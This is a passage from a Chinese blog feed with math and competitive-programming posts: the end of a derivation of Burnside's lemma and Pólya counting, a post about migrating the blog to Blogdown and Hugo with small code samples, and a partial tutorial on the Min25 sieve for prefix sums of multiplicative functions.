<p>于是得到 <span class="math inline">\(\text{stab}_G(x) \leq G\)</span>。</p>
</div>
<div id="轨道-稳定子定理" class="section level3">
<h3>轨道-稳定子定理</h3>
<p>联想之前的陪集划分，既然 <span class="math inline">\(\text{stab}_G(x) \leq G\)</span>，是否也可用子群 <span class="math inline">\(\text{stab}_G(x)\)</span> 对置换群 <span class="math inline">\(G\)</span> 进行左陪集划分？</p>
<p><span class="math inline">\(\forall \beta \in G, \ \beta \text{stab}_G(x)\)</span> 里的元素相当于作用于 <span class="math inline">\(x\)</span> 时 <span class="math inline">\(G\)</span> 中所有与 <span class="math inline">\(\beta\)</span> 等价的置换：</p>
<p><span class="math display">\[
\begin{aligned}
\beta \text{stab}_G(x) 
&amp; = \{ (\beta \circ \sigma) \circ x = \beta \circ x \mid \sigma \in G \} \\
&amp; \text{let } \tau = \beta \circ \sigma \\
&amp; = \{ \tau \circ x = \beta \circ x \mid \tau \in G \}
\end{aligned}
\]</span></p>
<p>由拉格朗日定理：</p>
<p><span class="math display">\[
|G| = |\text{stab}_G(x)| \cdot [G:\text{stab}_G(x)]
\]</span></p>
<p><span class="math inline">\([G:\text{stab}_G(x)]\)</span> 实际上就是本质不同的陪集种数。回忆前文提到了<span class="math inline">\(| \text{orb}_G(x) |\)</span> 实际上等价于仅考虑作用于 <span class="math inline">\(x\)</span> 时 <span class="math inline">\(G\)</span> 中本质不同的置换种数，因此：</p>
<p><span class="math display">\[
[G:\text{stab}_G(x)] = |\text{orb}_G(x)|
\]</span></p>
<p>便得到了<strong>轨道-稳定子定理 (oribt-stabilizer theorem)</strong>。</p>
<hr />
<p>设有限群 <span class="math inline">\(G\)</span> 作用于集合 <span class="math inline">\(M\)</span> ，<span class="math inline">\(x \in M\)</span>，则：</p>
<p><span class="math display">\[
|G| = |\text{stab}_G(x)| \cdot |\text{orb}_G(x)|
\]</span></p>
</div>
</div>
</div>
<div id="burnside-引理" class="section level1">
<h1>Burnside 引理</h1>
<div id="内容" class="section level2">
<h2>内容</h2>
<p>设有限群 <span class="math inline">\(G\)</span> 作用于有限集 <span class="math inline">\(M\)</span> 上，则轨道数：</p>
<p><span class="math display">\[
| M/G | = \frac{1}{|G|} \sum\limits_{\sigma \in G} |\text{fix}(\sigma)|
\]</span></p>
<p>其中 <span class="math inline">\(\text{fix}(\sigma)\)</span> 代表 <span class="math inline">\(\sigma\)</span> 的不动元构成的集合：</p>
<p><span class="math display">\[
\text{fix}(\sigma) = \{ x \mid x \in M, \sigma \circ x = x \}
\]</span></p>
</div>
<div id="证明" class="section level2">
<h2>证明</h2>
<p>回顾：</p>
<p><span class="math display">\[
\begin{aligned}
\text{stab}_G(x) &amp; = \{ \sigma \mid \sigma \in G, \sigma \circ x = x \}\\
\text{fix}(\sigma) &amp; = \{ x \mid x \in M, \sigma \circ x = x \}
\end{aligned}
\]</span></p>
<p>首先有一个引理：</p>
<p><span class="math display">\[
\sum\limits_{x \in M} | \text{stab}_G(x) | = \sum\limits_{\sigma \in G} | \text{fix}(\sigma) |
\]</span></p>
<p>发现等号左边实际上是对于集合 <span class="math inline">\(M\)</span> 内的每一个元素 <span class="math inline">\(x\)</span>，看有多少置换 <span class="math inline">\(\sigma\)</span> 满足 <span class="math inline">\(\sigma \circ x = x\)</span>；而等号右边是对于群 <span class="math inline">\(G\)</span> 内每一个置换 <span class="math inline">\(\sigma\)</span>，看有多少元素 <span class="math inline">\(x\)</span> 满足 <span class="math inline">\(\sigma \circ x = x\)</span>。换句话说，等号两边本质上都是求集合 <span class="math inline">\(\{ (\sigma, x) \mid \sigma \in G, x \in M, \sigma \circ x = x \}\)</span> 的大小，因此是相等的。</p>
<hr />
<p>接下来证明 Burnside 引理就很容易了：</p>
<p>每个轨道对轨道数贡献为 <span class="math inline">\(1\)</span>，故 <span class="math inline">\(x \in M\)</span> 对答案的贡献为 <span class="math inline">\(\frac{1}{| \text{orb}_G(x) |}\)</span>：</p>
<p><span class="math display">\[
  \begin{aligned}
  | M/G | 
  &amp; = \sum\limits_{x \in M} \frac{1}{ | \text{orb}_G(x) | } \\
  &amp; = \sum\limits_{x \in M}\frac{ | \text{stab}_G(x) | }{ |G| } \text{（轨道-稳定子定理）} \\
  &amp; = \frac{1}{|G|}\sum\limits_{\sigma \in G} | \text{fix}(\sigma) |
  \end{aligned}
\]</span></p>
</div>
</div>
<div id="pólya-计数法" class="section level1">
<h1>Pólya 计数法</h1>
<p>Burnside 引理启示我们要求轨道数，本质上还是要看不动元的数量之和。进一步，考虑在没有额外限制的情况下，对于置换 <span class="math inline">\(\sigma\)</span> 什么样的染色方案会称为不动元。</p>
<p>显然置换 <span class="math inline">\(\sigma\)</span> 可以被分解成若干个轮换，如：</p>
<p><span class="math display">\[
\sigma = (a_0 \enspace \dots \enspace a_t) \cdot (b_0 \enspace \dots \enspace b_s) \cdot \dots
\]</span></p>
<p>每一次置换作用时，每个轮换内的元素都会变成其右边的元素。故若要成为不动元，每个轮换内元素的颜色必然相同。这样一来，不动元数量之和其实就只与 <span class="math inline">\(\sigma\)</span> 所能被分解成的轮换个数相关了。</p>
<p>记染色可选的颜色数为 <span class="math inline">\(m\)</span>， <span class="math inline">\(c(\sigma)\)</span> 为置换 <span class="math inline">\(\sigma\)</span> 被分解为不交轮换乘积的个数，则由乘法原理：</p>
<p><span class="math display">\[
\text{fix}(\sigma) = m^{c(\sigma)}
\]</span></p>
<p>故：</p>
<p><span class="math display">\[
| M/G | = \frac{1}{|G|} \sum\limits_{\sigma \in G} m^{c(\sigma)}
\]</span></p>
<p>这就是算法竞赛中常见的 Pólya 计数法。</p>
</div>
<div id="常见题型" class="section level1">
<h1>常见题型</h1>
<p>Hmm… 感觉这一部分的当时<a href="https://codgician.me/pgslides/">幻灯片</a>说的还是比较清楚的，这里就不额外补充了（犯懒qwq）……</p>
<ul>
<li><a href="https://codgician.me/pgslides/#/coloring-necklace">项链染色</a> | <a href="https://www.luogu.com.cn/problem/P4980">洛谷 P4980：Pólya定理</a>（这道题里只有旋转）| <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P4980/polya_enumeration_theorem.cpp">参考代码</a></li>
<li><a href="https://codgician.me/pgslides/#/icpc-2019-nanchang-j">带限制的项链染色</a> | <a href="https://nanti.jisuanke.com/t/42585">ICPC 2019 南昌 J: Summon</a> | <a href="https://github.com/codgician/Competitive-Programming/blob/master/Jisuanke/42585/burnside_theorem_dp_matrix_fast_pow.cpp">参考代码</a></li>
<li><a href="https://codgician.me/pgslides/#/coloring-undirected-graph">无向图染色</a> | <a href="https://www.luogu.com.cn/problem/P4128">SHOI 2006: 有色图</a> | <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P4128/polya_enumeration_theorem.cpp">参考代码</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>Hello World... Again!</title>
			<link>https://codgician.me/zh-hans/posts/2019/10/hello-world/</link>
			<pubDate>Tue, 15 Oct 2019 14:28:28 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2019/10/hello-world/</guid>
			<description>pre code.sourceCode { white-space: pre; position: relative; } pre code.sourceCode span { display: inline-block; line-height: 1.25; } pre code.sourceCode span:empty { height: 1.2em; } code.sourceCode span { color: inherit; text-decoration: inherit; } div.sourceCode { margin: 1em 0; } pre.sourceCode { margin: 0; } @media screen { div.sourceCode { overflow: auto; } } @media print { pre code.sourceCode { white-space: pre-wrap; } pre code.sourceCode span { text-indent: -5em; padding-left: 5em; }</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>
<style type="text/css">
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  { color: #cccccc; background-color: #303030; }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffcfaf; } /* Alert */
code span.an { color: #7f9f7f; font-weight: bold; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #dca3a3; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #f0dfaf; } /* ControlFlow */
code span.ch { color: #dca3a3; } /* Char */
code span.cn { color: #dca3a3; font-weight: bold; } /* Constant */
code span.co { color: #7f9f7f; } /* Comment */
code span.cv { color: #7f9f7f; font-weight: bold; } /* CommentVar */
code span.do { color: #7f9f7f; } /* Documentation */
code span.dt { color: #dfdfbf; } /* DataType */
code span.dv { color: #dcdccc; } /* DecVal */
code span.er { color: #c3bf9f; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #c0bed1; } /* Float */
code span.fu { color: #efef8f; } /* Function */
code span.im { } /* Import */
code span.in { color: #7f9f7f; font-weight: bold; } /* Information */
code span.kw { color: #f0dfaf; } /* Keyword */
code span.op { color: #f0efd0; } /* Operator */
code span.ot { color: #efef8f; } /* Other */
code span.pp { color: #ffcfaf; font-weight: bold; } /* Preprocessor */
code span.sc { color: #dca3a3; } /* SpecialChar */
code span.ss { color: #cc9393; } /* SpecialString */
code span.st { color: #cc9393; } /* String */
code span.va { } /* Variable */
code span.vs { color: #cc9393; } /* VerbatimString */
code span.wa { color: #7f9f7f; font-weight: bold; } /* Warning */
</style>

<div id="TOC">
<ul>
<li><a href="#三个代表">三个代表</a>
<ul>
<li><a href="#一点微小的代码">一点微小的代码</a></li>
<li><a href="#一点微小的公式">一点微小的公式</a></li>
<li><a href="#一点微小的图表">一点微小的图表</a></li>
</ul></li>
</ul>
</div>

<p>你好，世界…… 又来一次~</p>
<p>花了几天终于把博客从 Hexo 迁移到了 Blogdown + Hugo，整个过程比我想象的要麻烦一些。</p>
<p>现在有了 Hugo，页面渲染速度和多语言环境支持都好了不少。另外，有了 RMarkdown，也可以比较优雅地用代码绘制图表了。</p>
<p>新的博客主题采用的是魔改版的 <a href="https://github.com/Track3/Hermit">Hermit</a>。这是一个非常不错的主题，并且如果你也是暗黑主题爱好者的话我非常非常推荐它。我按照自己的口味调整了一下主题的配色，并且做了一些乱七八糟的魔改来更好兼容 Blogdown。不管怎样现在这样子看起来还不错~</p>
<p>像之前一样，我依然在 <a href="https://github.com/codgician/codgician.github.io">仓库</a> 的 <code>source</code> 分支下开源了博客的源文件，如果感兴趣的话可以参考一番。</p>
<hr />
<p>下面用<del>三个代表</del>展示一下这个新组合的一些功能，另外如果你是用大屏设备访问的话可以在菜单里面打开目录。</p>
<div id="三个代表" class="section level1">
<h1>三个代表</h1>
<div id="一点微小的代码" class="section level2">
<h2>一点微小的代码</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb1-1"><a href="#cb1-1"></a><span class="fu">putStrLn</span> <span class="st">&quot;Hello World... Again!&quot;</span></span></code></pre></div>
</div>
<div id="一点微小的公式" class="section level2">
<h2>一点微小的公式</h2>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} f(i) &amp; = \sum\limits_{i = 1}^{n} \left[i \in \mathbb{P} \right] f(i) + \sum\limits_{i = 1}^{n} \left[i \not \in \mathbb{P} \right] f(i) \\
&amp; = \sum\limits_{i = 1}^{n} \left[i \in \mathbb{P} \right] f(i) + f(1) + \sum\limits_{p \in \mathbb{P}}\sum\limits_{1 \le p^e \le n}f(p^e)\sum\limits_{i = 1}^{\left\lfloor \frac{n}{p^e} \right\rfloor}f(i)
\end{aligned}
\]</span></p>
</div>
<div id="一点微小的图表" class="section level2">
<h2>一点微小的图表</h2>
<div class="sourceCode" id="cb2"><pre class="sourceCode r"><code class="sourceCode r"><span id="cb2-1"><a href="#cb2-1"></a><span class="kw">par</span>(<span class="dt">bg =</span> <span class="st">&quot;gray&quot;</span>, <span class="dt">mar =</span> <span class="kw">c</span>(<span class="dv">0</span>, <span class="dv">1</span>, <span class="dv">0</span>, <span class="dv">1</span>))</span>
<span id="cb2-2"><a href="#cb2-2"></a><span class="kw">pie</span>(<span class="kw">c</span>(<span class="dv">90</span>, <span class="dv">5</span>, <span class="dv">5</span>), <span class="kw">c</span>(<span class="st">&quot;git&quot;</span>, <span class="st">&quot;fit&quot;</span>, <span class="st">&quot;wit&quot;</span>), <span class="dt">col =</span> <span class="kw">gray</span>(<span class="kw">seq</span>(<span class="fl">0.3</span>, <span class="fl">0.6</span>, <span class="dt">length =</span> <span class="dv">3</span>)))</span></code></pre></div>
<div class="figure"><span id="fig:pie"></span>
<img src="/posts/life/hello-world/hello-world.zh-hans_files/figure-html/pie-1.png" alt="What is inside me?" width="672" />
<p class="caption">
Figure 1: What is inside me?
</p>
</div>
</div>
</div>
]]></content>
		</item>
		
		<item>
			<title>浅谈 Min25 筛</title>
			<link>https://codgician.me/zh-hans/posts/2019/09/min25-sieve/</link>
			<pubDate>Sun, 01 Sep 2019 13:07:42 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2019/09/min25-sieve/</guid>
			<description>前言 Min25 筛 核心思想 筛素数答案 筛非质数答案 应用 模板 类积性函数？ 带条件的前缀和？ 前缀积？ 小结 前言 Min25 筛是一种对于满足特定条件积性函数的前缀和的亚线性</description>
			<content type="html"><![CDATA[ 

<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#前言">前言</a></li>
<li><a href="#min25-筛">Min25 筛</a>
<ul>
<li><a href="#核心思想">核心思想</a></li>
<li><a href="#筛素数答案">筛素数答案</a></li>
<li><a href="#筛非质数答案">筛非质数答案</a></li>
</ul></li>
<li><a href="#应用">应用</a>
<ul>
<li><a href="#模板">模板</a></li>
<li><a href="#类积性函数">类积性函数？</a></li>
<li><a href="#带条件的前缀和">带条件的前缀和？</a></li>
<li><a href="#前缀积">前缀积？</a></li>
</ul></li>
<li><a href="#小结">小结</a></li>
</ul>
</div>

<div id="前言" class="section level1">
<h1>前言</h1>
<p>Min25 筛是一种对于满足特定条件积性函数的前缀和的亚线性筛法。虽说 Min25 筛对积性函数有一定要求，但其实常见的很多积性函数都是能被筛出来的。另外，Min25 筛也能引出不少灵活变化，故个人感觉也是一种非常有趣的筛法。</p>
</div>
<div id="min25-筛" class="section level1">
<h1>Min25 筛</h1>
<div id="核心思想" class="section level2">
<h2>核心思想</h2>
<p>下文默认记 <span class="math inline">\(P\)</span> 为素数集，<span class="math inline">\(P_i\)</span> 代表其中第 <span class="math inline">\(i\)</span> 大的素数并默认 <span class="math inline">\(p \in P\)</span>。若函数 <span class="math inline">\(f(x)\)</span> 满足：</p>
<ul>
<li><span class="math inline">\(f(p)\)</span> 存在多项式表示；</li>
<li><span class="math inline">\(f(p^e)\)</span> 可被快速计算；</li>
<li>若 <span class="math inline">\(a \perp b\)</span>，则 <span class="math inline">\(f(ab) = f(a)f(b)\)</span>。</li>
</ul>
<p>Min25 筛可在 <span class="math inline">\(\mathcal{O}(\frac{n^\frac{3}{4}}{\log{n}})\)</span> 的复杂度内计算 <span class="math inline">\(\sum\limits_{i = 1}^{n} f(i)\)</span>，其核心思想即将 <span class="math inline">\([1, n]\)</span> 分为质数、<span class="math inline">\(1\)</span> 和剩余数三个部分进行讨论：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} f(i) &amp; = \sum\limits_{i = 1}^{n} \left[i \in P \right] f(i) + \sum\limits_{i = 1}^{n} \left[i \not \in P \right] f(i) \\
&amp; = \sum\limits_{i = 1}^{n} \left[i \in P \right] f(i) + f(1) + \sum\limits_{p \in P}\sum\limits_{1 \le p^e \le n}f(p^e)\sum\limits_{i = 1}^{\left\lfloor \frac{n}{p^e} \right\rfloor}f(i)
\end{aligned}
\]</span></p>
</div>
<div id="筛素数答案" class="section level2">
<h2>筛素数答案</h2>
<p>既然前面提到了在素数处 <span class="math inline">\(f\)</span> 应有多项式表示，那么我们可以对每个幂次分开考虑。即我们可以把问题简化为计算 <span class="math inline">\(f(p) = p^k\)</span> 的情形，只要对所有的 <span class="math inline">\(k\)</span> 分别计算出结果再乘上对应系数即可。</p>
<p>首先我们考虑求解：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} [i \in P] f(i)
\]</span></p>
<p>考虑先线性筛出不大于 <span class="math inline">\(\sqrt{n}\)</span> 的所有素数作为 <span class="math inline">\(P\)</span>。记 <span class="math inline">\(minp(x)\)</span> 代表 <span class="math inline">\(x\)</span> 的最小素因子，令：</p>
<p><span class="math display">\[
g(n, j) = \sum\limits_{i = 2}^{n} \left[i \in P \text{ or } minp(i) &gt; P_j \right] f(i)
\]</span></p>
<p>则有：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} \left[i \in P \right] f(i) = g(n, |P|)
\]</span></p>
<p>考虑如何对 <span class="math inline">\(g\)</span> 进行状态转移。<span class="math inline">\(g(n, j)\)</span> 在 <span class="math inline">\(g(n, j - 1)\)</span> 的基础上少了所有非质数并且最小质因子恰为 <span class="math inline">\(P_j\)</span> 的数作为因变量的 <span class="math inline">\(f\)</span> 值。显然，这些数可以由一个最小质因子大于 <span class="math inline">\(P_j\)</span> 的数 <span class="math inline">\(t\)</span> 乘上 <span class="math inline">\(P_j\)</span> 得到。因为 <span class="math inline">\(f\)</span> 是积性函数且 <span class="math inline">\(t \perp P_j\)</span>，因此 <span class="math inline">\(f(tP_j) = f(P_j)f(t)\)</span>。考虑把 <span class="math inline">\(f(P_j)\)</span> 提出来，则需要减去的部分即为：</p>
<p><span class="math display">\[
f(P_j) \left[ g(\left\lfloor \frac{n}{P_j} \right\rfloor, j - 1) - \sum\limits_{i = 1}^{j - 1} f(P_i) \right]
\]</span></p>
<p>式子中的 <span class="math inline">\(\sum\limits_{i = 1}^{j - 1} f(P_i)\)</span> 本质上就是 <span class="math inline">\(\sum\limits_{i = 1}^{j - 1} P_i^k\)</span>，因此完全可以在筛素数的时候一并处理出来。</p>
<p>完整的状态转移即：</p>
<p><span class="math display">\[
g(n, j) = 
\begin{cases}
g(n, j - 1) - f(P_j)\left[ g(\left\lfloor \frac{n}{P_j} \right\rfloor, j - 1) - \sum\limits_{i = 1}^{j - 1}f(P_i) \right] &amp; {P_j}^2 \le n \\
g(n, j - 1) &amp; \text{otherwise} 
\end{cases}
\]</span></p>
<p>对于初值，有 <span class="math inline">\(g(n, 0) = \sum\limits_{i = 2}^{n}f(i)\)</span>。如果次数较低，比如平方和立方和都是有公式可以快速得出的，而如果次数较高的话就是多项式插值经典问题了。</p>
<p>接下来讨论一些实现上的细节。首先，第二维可以滚动以节约空间。另外由于 <span class="math inline">\(n\)</span> 比较大，故显然需要对第一维离散化。</p>
<p>又由向下取整的一个性质：</p>
<p><span class="math display">\[
\left\lfloor \frac{\left\lfloor\frac{n}{a}\right\rfloor}{b} \right\rfloor = \left\lfloor \frac{n}{ab} \right\rfloor
\]</span></p>
<p>故转移时所需要的第一维一定形如 <span class="math inline">\(\left\lfloor \frac{n}{x} \right\rfloor\)</span> 形式，我们可以对这 <span class="math inline">\(\mathcal{O}(\sqrt{n})\)</span> 个数离散化一下。如果用 <code>std::map</code> 的话会多白给一个 <span class="math inline">\(\mathcal{O}(\log{n})\)</span>，一种更高效的做法是用两个数组，其中 <span class="math inline">\(indx1[x]\)</span> 表示 <span class="math inline">\(x\)</span> 离散化后的下标，而 <span class="math inline">\(indx2[x]\)</span> 表示 <span class="math inline">\(\frac{n}{x}\)</span> 对应的下标。这样的好处在于两个数组的下标都不会超过 <span class="math inline">\(\sqrt{n}\)</span>。在访问 <span class="math inline">\(x\)</span> 离散化后的下标时，若 <span class="math inline">\(x &lt; \sqrt{n}\)</span> 则可直接访问 <span class="math inline">\(indx1[x]\)</span>，而若 <span class="math inline">\(x \ge \sqrt{n}\)</span> 则可访问 <span class="math inline">\(indx2[\frac{n}{x}]\)</span>，实属精妙。</p>
</div>
<div id="筛非质数答案" class="section level2">
<h2>筛非质数答案</h2>
<p>接下来我们考虑求解：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} \left[i \not \in P \right] f(i)
\]</span></p>
<p>由于 <span class="math inline">\(f\)</span> 在素数处有多项式表示，因此在筛 <span class="math inline">\(g\)</span> 的时候我们可以按每一个幂次分开计算。但是如果把合数也拉进来，就不可以拆开了。因此这一部分中 <span class="math inline">\(f\)</span> 指的就是原方程。</p>
<p>令：</p>
<p><span class="math display">\[
s(n, j) = \sum\limits_{i = 2}^{n} \left[ minp(i) \ge P_j \right] f(i)
\]</span></p>
<p>很显然，我们最终想要的答案即：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n}f(i) = s(n, 1) + f(1)
\]</span></p>
<p>现在我们来考虑如何求解 <span class="math inline">\(s(n, 1)\)</span>。对 <span class="math inline">\(s\)</span> 进行状态转移的时候，我们可以沿用分类的思想，即把它分成素数处之和和剩余数处之和两部分：</p>
<p><span class="math display">\[
s(n, j) = \sum\limits_{i = P_j + 1}^{n} \left[ i \in P \right]f(i) + \sum\limits_{i = P_j + 1}^{n} \left[i \not \in P \right] f(i) 
\]</span></p>
<p>第一部分我们之前已经解决了，就是 <span class="math inline">\(g(n, |P|) - \sum\limits_{k = 1}^{j - 1} f(P_k)\)</span>。</p>
<p>对于第二部分，既然是满足 <span class="math inline">\(minp \ge P_j\)</span> 的合数，那么自然可以表示为 <span class="math inline">\({P_j}^e \cdot t\)</span> 的形式（且满足 <span class="math inline">\({P_j}^e \perp t\)</span>）。与此同时，显然有 <span class="math inline">\(minp(t) \ge P_{j + 1}\)</span>。我们可以先枚举最小素因子 <span class="math inline">\(P_k\)</span>，然后对其枚举幂次 <span class="math inline">\(e\)</span>，然后利用积性函数的性质作如下计算：</p>
<p><span class="math display">\[
\sum\limits_{k = j}^{|P|}\sum\limits_{{P_k}^{e + 1} \le n} \left[ f({P_k}^e) \cdot s(\left\lfloor \frac{n}{{P_k}^{e}} \right\rfloor, k + 1) + f({P_k}^{e + 1}) \right]
\]</span></p>
<p>最后加上 <span class="math inline">\(f({P_k}^{e + 1})\)</span> 的原因是前面利用积性函数性质的部分无法计算形如 <span class="math inline">\(f(p^k)\)</span> 处的值。</p>
<p>完整的状态转移如下：</p>
<p><span class="math display">\[
\begin{aligned}
s(n, j) &amp; =  g(n, |P|) - \sum\limits_{k = 1}^{j - 1}f(P_k) \\ 
&amp; + \sum\limits_{k = j}^{|P|}\sum\limits_{{P_k}^{e + 1} \le n} \left[ f({P_k}^e) \cdot s(\left\lfloor \frac{n}{{P_k}^{e}} \right\rfloor, k + 1) + f({P_k}^{e + 1}) \right]
\end{aligned}
\]</span></p>
<p>直接递归搜即可，不需要记忆化复杂度也是对的（<del>证明不来</del>），如果有多个状态可以考虑开个结构体一起转移。</p>
</div>
</div>
<div id="应用" class="section level1">
<h1>应用</h1>
<div id="模板" class="section level2">
<h2>模板</h2>
<p>首先可以试试洛谷上的模板题：<a href="https://www.luogu.com.cn/problem/P5325">Luogu P5325: Min25筛</a>。同时附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P5325/min25_sieve.cpp">我的代码</a> 以供参考。</p>
<hr />
<p>那对于常见的一些数论函数呢？</p>
<p>欧拉函数 <span class="math inline">\(\varphi\)</span>：</p>
<ul>
<li><span class="math inline">\(\varphi(p) = p - 1\)</span>，是个多项式；</li>
<li><span class="math inline">\(\varphi(p^e) = p^e (1 - \frac{1}{p}) = p^{e - 1}(p - 1)\)</span>，可以被快速计算；</li>
<li><span class="math inline">\(\varphi\)</span> 是个积性函数。</li>
</ul>
<p>莫比乌斯函数 <span class="math inline">\(\mu\)</span>：</p>
<ul>
<li><span class="math inline">\(\mu(p) = 1\)</span>；</li>
<li><span class="math inline">\(\mu(p^e) = 0 \ (e &gt; 1)\)</span>；</li>
<li><span class="math inline">\(\mu\)</span> 是积性函数。</li>
</ul>
<p>除数函数 <span class="math inline">\(d\)</span>：</p>
<ul>
<li><span class="math inline">\(d(p) = 2\)</span>；</li>
<li><span class="math inline">\(d(p^e) = e + 1\)</span>；</li>
<li><span class="math inline">\(d\)</span> 是积性函数。</li>
</ul>
<p>显然上述三种函数都是可以用 Min25 筛求解的。更多的例子这里就不列举了，大家可以自己试试看~</p>
</div>
<div id="类积性函数" class="section level2">
<h2>类积性函数？</h2>
<p>注意到 Min25 筛求解前缀和的过程本质上就是个 DP。考虑是否可以魔改一下 DP 方程使得其适用于一些其他的 <span class="math inline">\(f\)</span> 函数，比如类似于满足 <span class="math inline">\(\forall a \perp b, \  f(ab) = f(a) + f(b)\)</span> 的函数 <span class="math inline">\(f\)</span>。</p>
<p>前段时间乱逛计蒜客的时候发现了这道题：<a href="https://nanti.jisuanke.com/t/A2243">Jisuanke A2243: A Simple Math Question</a>。不妨就拿它作为例子吧。为了避免混淆下面简述题意时我对原题中的部分符号进行了修改。</p>
<hr />
<p>定义函数 <span class="math inline">\(t\)</span>：</p>
<p><span class="math display">\[
t(x) = ax^3 + bx^2 + cx + d
\]</span></p>
<p>定义函数 <span class="math inline">\(f\)</span>：</p>
<p><span class="math display">\[
f(\prod\limits_{i = 1}^{k} {p_i}^{a_i}) = \sum\limits_{i = 1}^{k} a_i t(p_i)
\]</span></p>
<p>其中 <span class="math inline">\(\prod\limits_{i = 1}^{k} p_i\)</span> 代表数 <span class="math inline">\(n\)</span> 的唯一分解式，且定义 <span class="math inline">\(f(1) = 0\)</span>。</p>
<p>给定 <span class="math inline">\(n, a, b, c, d\)</span>，试求解：<span class="math inline">\(\sum\limits_{i = 1}^{n} f(i)\)</span>。</p>
<p>原题数据范围大概是 <span class="math inline">\(10^8\)</span> 级别的，标程大概是勒让德定理。这里我们不妨把这道题加强一番，假定 <span class="math inline">\(n\)</span> 是 <span class="math inline">\(10^{10}\)</span> 级别，看看 Min25 筛能否解决之。</p>
<hr />
<p>首先观察一下 <span class="math inline">\(f\)</span>：</p>
<ul>
<li><span class="math inline">\(f(p) = t(p) = ap^3 + bp^2 + cp + d\)</span>，嗯有多项式表示；</li>
<li><span class="math inline">\(f(p^e) = e \cdot t(p)\)</span>，还是能够快速计算的；</li>
<li>虽然它并不是一个积性函数。但还是满足：<span class="math inline">\(\forall \ a \perp b, f(ab) = f(a) + f(b)\)</span></li>
</ul>
<p>我们先来考虑 <span class="math inline">\(s\)</span> 的转移。首先回顾一下对于积性函数我们的转移是：</p>
<p><span class="math display">\[
\begin{aligned}
s(n, j) 
&amp; = \sum\limits_{i = P_j + 1}^{n} \left[ i \in P \right]f(i) + \sum\limits_{i = P_j + 1}^{n} \left[i \not \in P \right] f(i) \\
&amp; = g(n, |P|) - \sum\limits_{k = 1}^{j - 1}f(P_k) \\ 
&amp; + \sum\limits_{k = j}^{|P|}\sum\limits_{{P_k}^{e + 1} \le n} \left[ f({P_k}^e) \cdot s(\left\lfloor \frac{n}{{P_k}^{e}} \right\rfloor, k + 1) + f({P_k}^{e + 1}) \right]
\end{aligned}
\]</span></p>
<p>对于第一部分，也就是 <span class="math inline">\(\sum\limits_{i = P_j + 1}^{n} \left[ i \in P \right]f(i)\)</span>，不必对其进行修改。由于我们在筛 <span class="math inline">\(s\)</span> 的时候只会用到 <span class="math inline">\(g(n, |P|)\)</span>，其中只包含素数处的值，因此我们大可将其当作积性函数来筛出 <span class="math inline">\(g\)</span>，筛 <span class="math inline">\(g\)</span> 的过程保持和上文一样就行了。</p>
<p>对于第二部分，发现本质上要解决的是由 <span class="math inline">\(\sum\limits_{p^e \perp k} f(k)\)</span> 快速得出 <span class="math inline">\(\sum\limits_{p^e \perp k} f(p^e \cdot k)\)</span> 的问题。对于积性函数，有：</p>
<p><span class="math display">\[
\sum\limits_{p^e \perp k} f(p^e \cdot k) = f(p^e) \sum\limits_{p^e \perp k}f(k)
\]</span></p>
<p>而对于本题中的函数，如果我们记这个和式的项数为 <span class="math inline">\(m\)</span>，则有：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{p^e \perp k} f(p^e \cdot k) 
&amp; = \sum\limits_{p^e \perp k} \left[ f(p^e) + f(k) \right] \\
&amp; = m \cdot f(p^e) + \sum\limits_{p^e \perp k}f(k) 
\end{aligned}
\]</span></p>
<p>也就是说，第二部分可以改成如下形式：</p>
<p><span class="math display">\[
\sum\limits_{k = j}^{|P|}\sum\limits_{{P_k}^{e + 1} \le n} \left[ m \cdot f({P_k}^e) +  s(\left\lfloor \frac{n}{{P_k}^{e}} \right\rfloor, k + 1) + f({P_k}^{e + 1}) \right]
\]</span></p>
<p>当然，这会让这一部分的复杂度多一个快速幂带来的 <span class="math inline">\(\mathcal{O}(\log{n})\)</span>。</p>
